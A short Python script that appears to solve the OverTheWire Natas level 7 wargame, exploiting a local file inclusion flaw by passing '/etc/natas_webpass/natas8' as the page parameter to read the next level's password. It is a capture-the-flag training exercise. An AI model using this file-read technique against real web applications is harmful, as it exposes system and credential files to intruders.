import requests
import time

url = "http://natas7.natas.labs.overthewire.org/"
auth = ("natas7", "secret")

print("[*]Connecting. . .")

params = {
    "page": "/etc/natas_webpass/natas8"
}

ses_get = requests.get(url=url, params=params, auth=auth)

print("[+]Finally! Your Password:")
time.sleep(0.8)
print(ses_get.text)